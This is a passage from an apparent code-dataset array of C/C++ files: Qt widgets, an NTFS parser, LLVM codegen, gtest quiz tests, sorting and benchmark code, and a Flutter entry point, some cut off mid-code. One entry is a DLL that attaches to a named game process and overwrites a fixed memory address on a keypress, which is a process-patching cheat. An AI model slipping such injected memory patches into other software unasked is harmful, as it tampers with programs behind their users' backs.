 QSqlQuery query;\n  query.prepare(\"DELETE FROM tasks WHERE id = :id\");\n  query.bindValue(\":id\", id);\n  query.exec();\n}\n\nvoid TodoWidget::handleAddTask(QString title) {\n  QSqlQuery query;\n  query.prepare(\"INSERT INTO tasks (title) VALUES (:title)\");\n  query.bindValue(\":title\", title);\n  if (!query.exec()) {\n    qDebug() << \"ERROR: Add Task Error - \" << query.lastError();\n  }\n  int id = query.lastInsertId().toInt();\n  TaskWidget *taskWidget = new TaskWidget(id, tasksList);\n  QListWidgetItem *item = new QListWidgetItem();\n  item->setSizeHint(QSize(taskWidget->width(), taskWidget->height()));\n  tasksList->insertItem(0, item);\n  tasksList->setItemWidget(item, taskWidget);\n  connect(taskWidget, &TaskWidget::deleteTaskSignal, this,\n          &TodoWidget::handleDeleteTask);\n\n  connect(taskWidget, &TaskWidget::addProjectTask, this,\n          [this](int taskId) { emit addProjectTask(taskId); });\n}\nvoid TodoWidget::handleProcessButton() {\n  for (int i = 0; i < tasksList->count(); i++) {\n    tasksList->setCurrentRow(i);\n    TaskWidget *widget =\n        qobject_cast<TaskWidget *>(tasksList->itemWidget(tasksList->item(i)));\n    widget->handleProcessTask();\n  }\n  refreshTasksList();\n}\n",
    "// TESTE 03 - conjunto de remo\u00e7\u00f5es de elemento pelo \u00edndice \r\n\r\n#include \"array_list.hpp\" // Inclui o cabe\u00e7alho da implementa\u00e7\u00e3o da lista din\u00e2mica (vetor)\r\n#include <iostream> // Inclui a biblioteca de entrada e sa\u00edda padr\u00e3o\r\n#include <chrono> // Inclui a biblioteca para medi\u00e7\u00e3o de tempo\r\n\r\nvoid test_remove_at() { // Fun\u00e7\u00e3o que testa a remo\u00e7\u00e3o de elementos pelo \u00edndice\r\n    array_list arr; // Cria uma inst\u00e2ncia de array_list chamada arr\r\n    const int NUM_ELEMENTS = 10000; // Define uma constante para o n\u00famero de elementos a serem inseridos\r\n\r\n    // Inserir elementos no vetor\r\n    for (int i = 0; i < NUM_ELEMENTS; ++i) { // Loop que itera de 0 at\u00e9 NUM_ELEMENTS - 1\r\n        arr.push_back(i); // Insere o elemento 'i' no final do vetor\r\n    }\r\n\r\n    auto start = std::chrono::high_resolution_clock::now(); // Marca o tempo inicial\r\n    for (int i = 0; i < NUM_ELEMENTS; ++i) { // Loop que itera de 0 at\u00e9 NUM_ELEMENTS - 1\r\n        arr.remove_at(0);  // Remove o primeiro elemento repetidamente\r\n    }\r\n    auto end = std::chrono::high_resolution_clock::now(); // Marca o tempo final\r\n    std::chrono::duration<double, std::milli> duration = end - start; // Calcula a dura\u00e7\u00e3o da execu\u00e7\u00e3o em milissegundos\r\n\r\n    std::cout << \"Remo\u00e7\u00e3o pelo \u00edndice com \" << NUM_ELEMENTS << \" elementos: \" << duration.count() << \" ms\" << std::endl; // Exibe o tempo de execu\u00e7\u00e3o\r\n}\r\n\r\nint main() {\r\n    test_remove_at(); // Chama a fun\u00e7\u00e3o de teste para remo\u00e7\u00e3o pelo \u00edndice\r\n    return 0; // Retorna 0, indicando que o programa foi executado com sucesso\r\n}\r\n",
    "#include <stdio.h>\n#include <stdint.h>\n#include <stdlib.h>\n#include <string.h>\n#include <errno.h>\n\n#pragma pack(push, 1)\nstruct NTFSBootSector {\n    uint8_t jmp[3];\n    uint8_t oem[8];\n    uint16_t bytesPerSector;\n    uint8_t sectorPerCluster;\n    uint16_t reservedSectors;\n    uint8_t reversed1[5];\n    uint8_t media;\n    uint8_t reversed2[18];\n    uint64_t totalSectors;\n    uint8_t startOfMFT[8];\n    uint64_t startOfMFTMirr;\n    uint8_t MFTEntrySize;\n    uint8_t reversed3[3];\n    uint8_t indexRecordSize;\n    uint64_t serialNumber;\n    uint8_t reversed4[430];\n    uint8_t signature[2];\n};\n\nstruct MFTEntryHeader {\n    uint32_t signature;\n    uint16_t fixupOffset;\n    uint16_t fixupCount;\n    uint64_t LSN;\n    uint16_t sequenceNumber;\n    uint16_t linkCount;\n    uint8_t attributeOffset[2];\n    uint16_t flags;\n    uint32_t usedSize;\n    uint32_t allocatedSize;\n    uint64_t baseFileRecord;\n    uint16_t nextAttributeID;\n};\n\nstruct AttributeHeader {\n    uint32_t attributeType;\n    uint8_t length[4];\n    uint8_t nonResidentFlag;\n    uint8_t nameLength;\n    uint16_t nameOffset;\n    uint16_t flags;\n    uint16_t attributeID;\n};\n\nstruct NonResident {\n    uint8_t startVCN[8];\n    uint8_t endVCN[8];\n    uint8_t runListOffset[2];\n    uint16_t compressionUnitSize;\n    uint32_t padding;\n    uint64_t allocatedSize;\n    uint64_t dataSize;\n    uint64_t initializedSize;\n};\n#pragma pack(pop)\n\nvoid usage() {\n    printf(\"syntas: ntfs-parser <file>\\n\");\n    printf(\"sample: ntfs-parser a.dd\\n\");\n}\n\nuint16_t ltob_16(uint8_t* bytes) {\n    return bytes[0] | (bytes[1] << 8);\n}\n\nuint32_t ltob_32(uint8_t* bytes) {\n\treturn bytes[0] | (bytes[1] << 8) | (bytes[2] << 16) | (bytes[3] << 24);\n}\n\nuint64_t ltob_64(uint8_t* bytes) {\n    uint64_t result = 0;\n    for (int i = 0; i < 8; i++) {\n        result |= (uint64_t)bytes[i] << (i * 8);\n    }\n    return result;\n}\n\nuint64_t convert_to_big_endian(uint8_t* bytes, int size) {\n    uint64_t result = 0;\n    for (int i = 0; i < size; i++) {\n        result |= (uint64_t)bytes[i] << (8 * i);\n    }\n    return result;\n}\n\nvoid read_runlist(FILE* file, uint32_t offset, uint16_t runlist_offset) {\n    uint32_t runlist = offset + runlist_offset;\n    uint64_t lcn = 0;\n\n    while(1) {\n        // printf(\"%X\\n\", runlist);\n        fseek(file, runlist, SEEK_SET);\n        uint8_t byte;\n        fread(&byte, sizeof(uint8_t), 1, file);\n        runlist += 1;\n        \n        if(byte == 0) {\n            break;\n        } else {\n            uint8_t run_offset_size = (byte & 0xF0) >> 4;\n            uint8_t run_length_size = byte & 0x0F;\n            \n            fseek(file, runlist, SEEK_SET);\n            uint8_t run_length[8] = {0};  // \ucd5c\ub300 8\ubc14\uc774\ud2b8 \ud560\ub2f9\n            fread(run_length, run_length_size, 1, file);\n            uint64_t length = convert_to_big_endian(run_length, run_length_size);\n            // printf(\"%lu \", length);\n            runlist += run_length_size;\n\n            fseek(file, runlist, SEEK_SET);\n            uint8_t run_offset[8] = {0};  // \ucd5c\ub300 8\ubc14\uc774\ud2b8 \ud560\ub2f9\n            fread(run_offset, run_offset_size, 1, file);\n            int64_t offset = (int64_t)convert_to_big_endian(run_offset, run_offset_size);\n            \n            // \uc74c\uc218 \ucc98\ub9ac\n            if (run_offset_size > 0 && (offset & ((uint64_t)1 << (run_offset_size * 8 - 1)))) {\n                offset |= ~0ULL << (run_offset_size * 8);\n            }\n            // printf(\"%ld %ld\\n\", lcn, offset);\n            lcn = lcn + offset;\n            \n            printf(\"%ld \", lcn);\n            printf(\"%lu\\n\", length);\n            runlist += run_offset_size;\n        }\n    }\n}\n\n// void read_runlist(FILE* file, uint32_t offset, uint16_t runlist_offset) {\n//     uint32_t runlist = offset + runlist_offset + 1;\n//     while(1) {\n//         fseek(file, runlist, SEEK_SET);\n//         uint8_t byte;\n//         fread(&byte, sizeof(uint8_t), 1, file);\n//         // printf(\"%X \", byte);\n//         runlist += 1;\n//         if(byte == 0) {\n//             break;\n//         } else {\n//             uint8_t run_offset_size = (byte & 0xF0) >> 4;\n//             // printf(\"Run offset size: %d\\n\", run_offset_size);\n//             uint8_t run_length_size = byte & 0x0F;\n//             // printf(\"Run length size: %d\\n\", run_length_size);\n//             fseek(file, runlist, SEEK_SET);\n//             uint8_t run_length[run_length_size];\n//             fread(run_length, run_length_size, 1, file);\n//             for (int i = 0; i < run_length_size; i++) {\n//                 printf(\"%d\", run_length[i]);\n//             }\n//             printf(\" \");\n//             runlist += run_length_size;\n\n//             fseek(file, runlist, SEEK_SET);\n//             uint8_t run_offset[run_offset_size];\n//             fread(run_offset, run_offset_size, 1, file);\n//             for (int i = 0; i < run_offset_size; i++) {\n//                 printf(\"%X\", run_offset[i]);\n//             }\n//             printf(\"\\n\");\n//             runlist += run_offset_size;\n//         }\n//     }\n// }\n\nvoid read_attribute(FILE* file, uint32_t start_m",
    "#include \"GraphicsScene.h\"\r\n\r\n#include \"GraphicsRectItem.h\"\r\n\r\n#include <QGraphicsSceneMouseEvent>\r\n#include <QApplication>\r\n\r\n#include <QDebug>\r\n#include <QGraphicsPixmapItem>\r\n\r\nGraphicsScene::GraphicsScene(QObject *parent)\r\n    : QGraphicsScene(parent)\r\n{\r\n\r\n}\r\n\r\nGraphicsScene::~GraphicsScene()\r\n{\r\n}\r\n\r\nvoid GraphicsScene::Initialize()\r\n{\r\n\r\n}\r\n\r\nvoid GraphicsScene::SetImagePath(const QString &imagePath)\r\n{\r\n    if (!m_pixmapItem)\r\n    {\r\n        m_pixmapItem = new GraphicsPixmapItem();\r\n        addItem(m_pixmapItem);\r\n    }\r\n\r\n    QPixmap pixmap(imagePath);\r\n    m_pixmapItem->setPixmap(pixmap);\r\n    m_pixmapItem->boundingRect();\r\n    setSceneRect(pixmap.rect());\r\n}\r\n\r\nQGraphicsPixmapItem *GraphicsScene::GetPixmapItem() const\r\n{\r\n    return m_pixmapItem;\r\n}\r\n\r\nvoid GraphicsScene::SetOperation(Operation operation)\r\n{\r\n    m_operation = operation;\r\n}\r\n\r\nvoid GraphicsScene::mousePressEvent(QGraphicsSceneMouseEvent *event)\r\n{\r\n    m_startPos = event->scenePos();\r\n\r\n    QGraphicsScene::mousePressEvent(event);\r\n\r\n    qDebug() << \"mousePressEvent\" << m_pixmapItem->boundingRect();\r\n}\r\n\r\nvoid GraphicsScene::mouseMoveEvent(QGraphicsSceneMouseEvent *event)\r\n{\r\n    auto currentPos = event->scenePos();\r\n\r\n    if (m_operation == Operation::None)\r\n    {\r\n\r\n    }\r\n    else\r\n    {\r\n        if (!m_drawingItem && (currentPos - m_startPos).manhattanLength() > QApplication::startDragDistance())\r\n        {\r\n            auto rectItem = new GraphicsRectItem();\r\n            rectItem->setBrush(Qt::red);\r\n            addItem(rectItem);\r\n\r\n            m_drawingItem = rectItem;\r\n        }\r\n\r\n        if (m_drawingItem)\r\n        {\r\n            if (auto item = qgraphicsitem_cast<GraphicsRectItem *>(m_drawingItem))\r\n            {\r\n                auto rect = QRectF(m_startPos, currentPos);\r\n                auto normaizedRect = rect.normalized();\r\n                item->setRect(normaizedRect);\r\n            }\r\n        }\r\n    }\r\n\r\n    QGraphicsScene::mouseMoveEvent(event);\r\n}\r\n\r\nvoid GraphicsScene::mouseReleaseEvent(QGraphicsSceneMouseEvent *event)\r\n{\r\n    m_drawingItem = nullptr;\r\n\r\n    QGraphicsScene::mouseReleaseEvent(event);\r\n}",
    "#include <iostream>\n#include \"codegen.h\"\n#include \"node.h\"\n\nusing namespace std;\n\nextern int yyparse();\nextern NBlock* programBlock;\n\n\nllvm::Function* createPrintfFunction(CodeGenContext& context)\n{\n    std::vector<llvm::Type*> printf_arg_types;\n    printf_arg_types.push_back(llvm::PointerType::getUnqual(MyContext)); //char*\n\n    std::cout << \"printf\" << std::endl;\n\n    llvm::FunctionType* printf_type =\n        llvm::FunctionType::get(\n            llvm::Type::getInt32Ty(MyContext), printf_arg_types, true);\n\n    llvm::Function *func = llvm::Function::Create(\n                printf_type, llvm::Function::ExternalLinkage,\n                llvm::Twine(\"printf\"),\n                context.module\n           );\n    func->setCallingConv(llvm::CallingConv::C);\n    return func;\n}\n\nvoid createEchoFunction(CodeGenContext& context, llvm::Function* printfFn)\n{\n    std::vector<llvm::Type*> echo_arg_types;\n    echo_arg_types.push_back(llvm::Type::getInt64Ty(MyContext));\n\n    llvm::FunctionType* echo_type =\n        llvm::FunctionType::get(\n            llvm::Type::getVoidTy(MyContext), echo_arg_types, false);\n\n    llvm::Function *func = llvm::Function::Create(\n                echo_type, llvm::Function::InternalLinkage,\n                llvm::Twine(\"out\"),\n                context.module\n           );\n    llvm::BasicBlock *bblock = llvm::BasicBlock::Create(MyContext, \"entry\", func, 0);\n\tcontext.pushBlock(bblock);\n    \n    const char *constValue = \"%d\\n\";\n    llvm::Constant *format_const = llvm::ConstantDataArray::getString(MyContext, constValue);\n    llvm::GlobalVariable *var =\n        new llvm::GlobalVariable(\n            *context.module, llvm::ArrayType::get(llvm::IntegerType::get(MyContext, 8), strlen(constValue)+1),\n            true, llvm::GlobalValue::PrivateLinkage, format_const, \".str\");\n    llvm::Constant *zero =\n        llvm::Constant::getNullValue(llvm::IntegerType::getInt32Ty(MyContext));\n\n    std::vector<llvm::Constant*> indices;\n    indices.push_back(zero);\n    indices.push_back(zero);\n    llvm::Constant *var_ref = llvm::ConstantExpr::getGetElementPtr(\n\tllvm::ArrayType::get(llvm::IntegerType::get(MyContext, 8), strlen(constValue)+1),\n        var, indices);\n\n    std::vector<Value*> args;\n    args.push_back(var_ref);\n\n    Function::arg_iterator argsValues = func->arg_begin();\n    Value* toPrint = &*argsValues++;\n    toPrint->setName(\"toPrint\");\n    args.push_back(toPrint);\n    \n\tCallInst *call = CallInst::Create(printfFn, makeArrayRef(args), \"\", bblock);\n\tReturnInst::Create(MyContext, bblock);\n\tcontext.popBlock();\n}\n\nvoid createCoreFunctions(CodeGenContext& context){\n\tllvm::Function* printfFn = createPrintfFunction(context);\n    createEchoFunction(context, printfFn);\n}\n",
    "#include \"pch.h\"\n#include \"Coding_Challenge.hpp\"\n#include <gtest/gtest.h>\n#include <sstream>\n\nclass Coding_Challenge_Test : public ::testing::Test {\nprotected:\n    Coding_Challenge quiz;\n};\n\nTEST_F(Coding_Challenge_Test, AddQuestionAndAnswer)\n{\n    quiz.add_question_and_answers(\"What is the 1 singular homology group of S^1? \\\"The integers Z.\\\"\");\n\n    std::unordered_set<std::string> answers = quiz.get_answers_from_question(\"What is the 1 singular homology group of S^1\");\n    ASSERT_EQ(answers.size(), 1);\n    ASSERT_EQ(quiz.find_answer_for_question(\"What is the 1 singular homology group of S^1\", \"The integers Z.\"), true);\n}\n\nTEST_F(Coding_Challenge_Test, AddTooLongQuestionAndAnswer)\n{\n    ASSERT_EQ(quiz.add_question_and_answers(\"Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aenean commodo ligula eget dolor. \"\n        \"Aenean massa. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Donec quam felis, ultricies nec, pellentesque eu, \"\n        \"pretium quis, sem. Nulla consequat massa quis enim. Donec pede justo, fringilla vel, aliquet nec, vulputate eget, arcu. In enim justo, rhoncus ut, imperdiet a,\"\n        \"venenatis vitae, justo. Nullam dictum felis eu pede mollis pretium. Integer tincidunt. Cras dapibus. Vivamus elementum semper nisi. Aenean vulputate eleifend tellus. \"\n        \"Aenean leo ligula, porttitor eu, consequat vitae, eleifend ac, enim. Aliquam lorem ante, dapibus in, viverra quis, feugiat a, tellus. Phasellus viverra nulla ut metus varius ...? \\\"The integers Z.\\\"\"),\n        QNA_MESSAGE::TOO_LONG\n        );\n}\n\nTEST_F(Coding_Challenge_Test, AddQuestionAndTooLongAnswer)\n{\n    ASSERT_EQ(quiz.add_question_and_answers(\"What is the Definition of the hawaiian earring? \\\"The Hawaiian earring H is the topological space defined by the union of circles in the Euclidean plane R^2 with center(1/n,0) and radius 1/n endowed with the subspace topology.\\\" \\\"More abstractly: the earring space can be described up to homeomorphism as the one-point compactification of a coproduct (in Top; a disjoint union space) of \"\n        \"countably many open intervals (e.g. section 2.1 of (Cannon-Conner 2000)). This shows that the specific radii converging to zero (which was taken to be 1/2 n above) don\u2019t actually matter. \"\n        \"Equivalently, the earring space is homeomorphic to the one-point compactification of the product space NxR, where the space of real numbers R\"\n        \"has the Euclidean topology and that of natural numbers N has the discrete topology.\\\"\"), QNA_MESSAGE::TOO_LONG);\n}\n\nTEST_F(Coding_Challenge_Test, AskStoredQuestion)\n{\n    quiz.set_questions_and_answers(\"What is the 1 singular homology group of S^1\", { \"The integers Z.\" });\n\n    std::unordered_set<std::string> output = quiz.ask_question(\"What is the 1 singular homology group of S^1?\");\n\n    ASSERT_EQ(*output.begin(), \"The integers Z.\");\n}\n\nTEST_F(Coding_Challenge_Test, AskNonStoredQuestion)\n{\n    std::unordered_set<std::string> output = quiz.ask_question(\"What is the meaning of life?\");\n\n    ASSERT_EQ(*output.begin(), \"The answer to life, universe and everything is 42.\\n\");\n}\n\nTEST_F(Coding_Challenge_Test, AskTooLongQuestion)\n{\n    std::unordered_set<std::string> output = quiz.ask_question(\"Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aenean commodo ligula eget dolor. \"\n        \"Aenean massa. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Donec quam felis, ultricies nec, pellentesque eu, \"\n        \"pretium quis, sem. Nulla consequat massa quis enim. Donec pede justo, fringilla vel, aliquet nec, vulputate eget, arcu. In enim justo, rhoncus ut, imperdiet a,\"\n        \"venenatis vitae, justo. Nullam dictum felis eu pede mollis pretium. Integer tincidunt. Cras dapibus. Vivamus elementum semper nisi. Aenean vulputate eleifend tellus. \"\n        \"Aenean leo ligula, porttitor eu, consequat vitae, eleifend ac, enim. Aliquam lorem ante, dapibus in, viverra quis, feugiat a, tellus. Phasellus viverra nulla ut metus varius ...?\");\n\n    ASSERT_EQ(output.empty(), true);\n}\n\nint main(int argc, char** argv)\n{\n    ::testing::InitGoogleTest(&argc, argv);\n    return RUN_ALL_TESTS();\n}",
    "\ufeff// dllmain.cpp : Defines the entry point for the DLL application.\r\n#include \"pch.h\"\r\n#include <Windows.h>\r\n#include <iostream>\r\n#include <Psapi.h>\r\n#include <shlwapi.h>\r\nvoid patch(BYTE* ptr, BYTE* buf, size_t len) {\r\n    DWORD curProtection;\r\n    VirtualProtect(ptr, len, PAGE_EXECUTE_READWRITE, &curProtection);\r\n    memcpy(ptr, buf, len);\r\n    VirtualProtect(ptr, len, curProtection, &curProtection);\r\n}\r\n\r\nDWORD WINAPI AppThread(HMODULE hModule) {\r\n    WCHAR fileName[512];\r\n    DWORD size = 512;\r\n    GetModuleFileNameW(NULL, fileName, size);\r\n    std::cout << fileName << std::endl;\r\n    if (CompareStringW(LOCALE_INVARIANT, 0, PathFindFileNameW(fileName), -1, L\"\u9006\u8ee2\u88c1\u5224\u3000\u914d\u4fe1\u7248.exe\", -1) != CSTR_EQUAL)\r\n    {\r\n        return TRUE;\r\n    }\r\n    while (true)\r\n    {\r\n        if (GetAsyncKeyState('K'))\r\n        {\r\n            *(int*)0x1002ED84 = 0x10;\r\n            Sleep(10000);\r\n        }\r\n    }\r\n    return TRUE;\r\n}\r\n\r\n\r\nBOOL APIENTRY DllMain( HMODULE hModule,\r\n                       DWORD  ul_reason_for_call,\r\n                       LPVOID lpReserved\r\n                     )\r\n{\r\n    switch (ul_reason_for_call)\r\n    {\r\n    case DLL_PROCESS_ATTACH:\r\n        CloseHandle(CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)AppThread, hModule, 0, nullptr));\r\n    case DLL_THREAD_ATTACH:\r\n    case DLL_THREAD_DETACH:\r\n    case DLL_PROCESS_DETACH:\r\n        break;\r\n    }\r\n    return TRUE;\r\n}\r\n\r\n",
    "\ufeff//#define WIN32_LEAN_AND_MEAN\n\n#include <iostream>\n#include <fstream>\n#include <string>\n#include <locale>\n#include <codecvt>\n#include <cstdlib>\n\n\n\n#include <winsock2.h>\n\n\n//#include <psapi.h>\n//#pragma comment(lib, \"psapi.lib\")\n//#include <windows.h>\n//#define BOOST_ASIO_NO_WIN32_LEAN_AND_MEAN\n#include <boost/asio.hpp>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n/*\nint main() {\n    std::string command = \"mychrome.exe --Kiosk --new-window http://baidu.com\";\n    int result = std::system(command.c_str());\n    if (result != 0) {\n        std::cerr << \"\u6267\u884c\u547d\u4ee4\u5931\u8d25\" << std::endl;\n    }\n    return 0;\n}*/\n/*\nint main() {\n        std::ifstream file(\"config.ini\");  // \u5c06 \"your_file.txt\" \u66ff\u6362\u4e3a\u5b9e\u9645\u7684\u6587\u4ef6\u540d\n        std::string line1, line2;\n\n        if (file.is_open()) {\n\n            std::getline(file, line1);\n            std::getline(file, line2);\n\n\n            file.close();\n        }\n        else {\n            std::cerr << \"\u65e0\u6cd5\u6253\u5f00\u6587\u4ef6\" << std::endl;\n        }\n\n        line1 = line1 + \".exe\";\n\n        // \u4f7f\u7528 codecvt \u8fdb\u884c\u8f6c\u6362\n        std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;\n        std::wstring wideStr = converter.from_bytes(line1);\n\n        // \u83b7\u53d6 wchar_t* \u6307\u9488\n        wchar_t* wcharPtr = const_cast<wchar_t*>(wideStr.c_str());\n\n\n\n        // \u4f7f\u7528 codecvt \u8fdb\u884c\u8f6c\u6362\n        std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converterurl;\n        std::wstring wideStrurl = converterurl.from_bytes(line2);\n\n        // \u83b7\u53d6 wchar_t* \u6307\u9488\n        wchar_t* wcharPtrurl = const_cast<wchar_t*>(wideStrurl.c_str());\n\n\n\n\n        // \u542f\u52a8 Chrome \u5e76\u6253\u5f00\u6307\u5b9a\u7f51\u5740\n        ShellExecuteW(NULL, L\"open\", wcharPtr, wcharPtrurl, NULL, SW_SHOWMAXIMIZED);\n        //wchar_t commandLine[] = L\"mychrome --Kiosk --new-window www.baidu.com\";\n\n        // \u6267\u884c\u547d\u4ee4\n        //ShellExecuteW(NULL, NULL, commandLine, NULL, NULL, SW_SHOWNORMAL);\n\n        delete[] wcharPtr;\n        delete[] wcharPtrurl;\n\n\n\n        // \u7b49\u5f85\u6d4f\u89c8\u5668\u7a97\u53e3\u51fa\u73b0\n        HWND hwnd = NULL;\n        while (hwnd == NULL) {\n            hwnd = FindWindowW(L\"Chrome_WidgetWin_1\", NULL);\n\n            Sleep(400);\n        }\n\n        // \u6a21\u62df\u6309\u4e0b F11 \u952e\u5b9e\u73b0\u5168\u5c4f\n        keybd_event(VK_F11, 0, 0, 0);\n        keybd_event(VK_F11, 0, KEYEVENTF_KEYUP, 0);\n\n\n\n        return 0;\n}*/\n\n\n\n\n\n\n\nvoid close() {\n    HWND hwnd = NULL;\n    while (hwnd == NULL) {\n        hwnd = FindWindowW(L\"Chrome_WidgetWin_1\", NULL);\n        SetForegroundWindow(hwnd);\n        Sleep(1000);\n    }\n    // \u6a21\u62df\u6309\u4e0b Alt \u952e\n    keybd_event(VK_MENU, 0, 0, 0);\n    // \u6a21\u62df\u6309\u4e0b F4 \u952e\n    keybd_event(VK_F4, 0, 0, 0);\n    // \u6a21\u62df\u91ca\u653e F4 \u952e\n    keybd_event(VK_F4, 0, KEYEVENTF_KEYUP, 0);\n    // \u6a21\u62df\u91ca\u653e Alt \u952e\n    keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0);\n}\n\n\n\n\nvoid refresh() {\n    HWND hwnd = NULL;\n    while (hwnd == NULL) {\n        hwnd = FindWindowW(L\"Chrome_WidgetWin_1\", NULL);\n        SetForegroundWindow(hwnd);\n        Sleep(1000);\n    }\n    // \u6a21\u62df\u6309\u4e0b Ctrl \u952e\n    keybd_event(VK_CONTROL, 0, 0, 0);\n    // \u6a21\u62df\u6309\u4e0b F5 \u952e\n    keybd_event(VK_F5, 0, 0, 0);\n    // \u6a21\u62df\u91ca\u653e F5 \u952e\n    keybd_event(VK_F5, 0, KEYEVENTF_KEYUP, 0);\n    // \u6a21\u62df\u91ca\u653e Ctrl \u952e\n    keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0);\n}\n\n\nvoid fullscreen() {\n    // \u7b49\u5f85\u6d4f\u89c8\u5668\u7a97\u53e3\u51fa\u73b0\n    HWND hwnd = NULL;\n    while (hwnd == NULL) {\n        hwnd = FindWindowW(L\"Chrome_WidgetWin_1\", NULL);\n        SetForegroundWindow(hwnd);\n        Sleep(1000);\n    }\n    Sleep(2000);\n\n    refresh();\n\n\n\n    // \u6a21\u62df\u6309\u4e0b F11 \u952e\u5b9e\u73b0\u5168\u5c4f\n    keybd_event(VK_F11, 0, 0, 0);\n    keybd_event(VK_F11, 0, KEYEVENTF_KEYUP, 0);\n}\n\nint boot() {\n    std::ifstream file(\"config.ini\");  // \n    if (!file.is_open()) {\n        std::cerr << \"\u65e0\u6cd5\u6253\u5f00\u6587\u4ef6\" << std::endl;\n        return 1;\n    }\n\n    std::string line1, line2, line3;\n    std::getline(file, line1);\n    std::getline(file, line2);\n    std::getline(file, line3);\n    file.close();\n\n\n    line1 = line1 + \".exe\";\n\n    int num = std::stoi(line3);\n\n    // \u4f7f\u7528 codecvt \u8fdb\u884c\u8f6c\u6362\uff0c\u5e76\u4f7f\u7528\u667a\u80fd\u6307\u9488\u7ba1\u7406\u5185\u5b58\n    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;\n    std::unique_ptr<wchar_t[]> wideStr = std::make_unique<wchar_t[]>(converter.from_bytes(line1).size() + 1);\n    wcscpy_s(wideStr.get(), converter.from_bytes(line1).size() + 1, converter.from_bytes(line1).c_str());\n\n    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converterurl;\n    std::unique_ptr<wchar_t[]> wideStrurl = std::make_unique<wchar_t[]>(converterurl.from_bytes(line2).size() + 1);\n    wcscpy_s(wideStrurl.get(), converterurl.from_bytes(line2).size() + 1, converterurl.from_bytes(line2).c_str());\n\n    // \u542f\u52a8 Chrome \u5e76\u6253\u5f00\u6307\u5b9a\u7f51\u5740\n    ShellExecuteW(NULL, L\"open\", wideStr.get(), wideStrurl.get(), NULL, SW_SHOWMAXIMIZED);\n\n    // \u7b49\u5f85\u6d4f\u89c8\u5668\u7a97\u53e3\u51fa\u73b0\n    HWND hwnd = NULL;\n    while (hwnd == NULL) {\n        hwnd = FindWindowW(L\"Chrome_WidgetWin_1\", NULL);\n        SetForegroundWindow(hwnd);\n        Sleep(1000);\n    }\n\n    Sleep(num);\n    fullscreen();\n    return 0;\n}\n\nvoid reboot() {\n    close();\n    boot();\n    \n}\n\nusing boost::asio::ip::tcp;\n\nvoid handleClient(tcp::socket socket) {\n\n    while (true) {\n        boost::asio::streambuf buffer;\n        boost::system::error_code error;\n        size_t length = boost::asio::read_until(socket, buffer, '\\n', err",
    "#include<iostream>\n\nusing namespace std;\n\nvoid print(int a[], int n) {\n\n\tint i;\n\n\tfor (i = 0; i < n; i++) {\n\t\tcout << a[i];\n\n\t\tif (i != n - 1) {\n\t\t\tcout << \", \";\n\t\t}\n\t}\n}\n\nvoid InsertionSort(int a[], int n, int step) {\n\n\tint i,j,item;\n\tfor (i = step; i < n; i++)\n\t{\n\t\titem = a[i];\n\t\tj = i ;\n\n\t\twhile (j >= step && item < a[j - step])\n\t\t{\n\t\t\ta[j] = a[j - step];\n\t\t\tj-=step;\n\t\t}\n\n\t\ta[j] = item;\n\t}\n}\n\nvoid ShellSort(int a[], int n) {\n\n\tint iteration = 1;\n\n\tfor (int step = n / 2; step > 0; step /= 2)\n\t{\n\t\tInsertionSort(a,n,step);\n\n\t\tcout << \"\\nThe list in iteration \" << iteration++ << \" looks like this : \\n\";\n\t\tprint(a, n);\n\t}\n\n\n}\n\n\nint main()\n{\n\tint a[30], n, i;\n\n\tcout << \"Enter list size : \";\n\tcin >> n;\n\n\tfor (i = 0; i < n; i++) {\n\t\tcout << \"Enter element no. \" << i + 1 << \" : \";\n\t\tcin >> a[i];\n\t}\n\n\tcout << \"The unsorted list : \\n\";\n\n\tfor (i = 0; i < n; i++) {\n\t\tcout << a[i];\n\n\t\tif (i != n - 1) {\n\t\t\tcout << \", \";\n\t\t}\n\t}\n\n\tShellSort(a, n);\n\n\tcout << \"\\nThe sorted list is : \\n\";\n\n\tprint(a, n);\n\n\treturn 1;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"album_music\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
